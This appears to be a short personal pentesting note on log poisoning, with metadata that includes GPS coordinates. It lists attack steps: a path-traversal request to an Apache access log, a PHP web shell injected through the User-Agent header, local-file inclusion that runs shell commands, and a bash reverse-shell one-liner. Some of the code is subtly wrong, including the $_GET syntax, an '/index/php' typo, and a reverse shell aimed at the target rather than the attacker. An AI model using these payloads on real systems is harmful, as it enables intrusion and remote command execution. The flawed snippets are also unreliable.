---
title: Log Poisoning
updated: 2025-05-12 02:28:57Z
created: 2025-04-18 11:07:45Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---




Note: this will leave 2 entries in the log file
* * * 
1. Try to traverse directories 
`curl http://target/cgi-bin/../../../../var/log/apache2/access.log`
2. Check if logs contain 'User-Agent' data being logged 
eg
`192.168.63.1 - - [12/Apr/2025:10:34:55 +0000] "GET /index.php HTTP/1.1" 200 2361 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geck) Chrom/100.0.4896.75 Safari/537.36"`
3. Using Burp > Repeater, send request with 'User-Agent' data:
```
GET /index/php?page=admin.php HTTP/1.1
Host: example.com
User-Agent: <?php echo system($_GET('cmd')); ?>
```
 4. Now that cmd has been injected into the log file, send following request:
```
GET /index/php?page=../../../../../../var/log/apache2/access.log&cmd=ps
Host: example.com
```
5. Other commands can be run now, like:
Directory listing: `ls -la` or `ls%20-la`
Reverse shell: `bash -i >& /dev/tcp/<target>/<port> 0>&1`